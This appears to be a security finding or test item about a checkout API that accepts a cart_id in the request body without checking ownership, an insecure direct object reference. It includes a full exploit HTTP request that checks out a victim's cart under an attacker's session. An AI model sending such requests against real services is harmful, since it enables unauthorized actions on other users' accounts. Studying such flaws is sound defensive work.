diagnosis: Checkout endpoint allows passing cart_id via the body, overriding the cookie. It looks up the cart and proceeds to checkout without verifying if the cart belongs to the currently authenticated user.
exploit_request:
POST /api/cart/checkout HTTP/1.1
Host: api.example.com
Content-Type: application/json
Cookie: cartId=attacker_cart; session=attacker_session

{"cart_id": "victim_cart_id"}
